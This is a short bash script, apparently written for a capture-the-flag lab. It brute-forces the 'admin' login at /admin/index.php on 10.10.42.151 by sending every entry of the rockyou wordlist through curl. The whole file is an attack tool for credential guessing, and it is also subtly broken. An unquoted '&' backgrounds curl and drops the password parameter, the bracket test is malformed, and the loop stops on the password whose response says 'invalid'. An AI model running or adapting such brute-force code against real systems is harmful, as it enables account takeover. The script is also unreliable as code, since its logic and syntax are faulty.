rockyou_path="/usr/share/wordlists/rockyou.txt"
ip_addr=10.10.42.151
endpoint="/admin/index.php"
username="admin"

head $rockyou_path

while read line;
do
	curl -X POST http://$ip_addr$endpoint?user="$username"&pass="$line" > bobo.txt
	cat bobo.txt
	grep "invalid" bobo.txt
	ret=$?
	if [ ret -eq 0]; then
		echo $line
		break
	fi
done < $rockyou_path
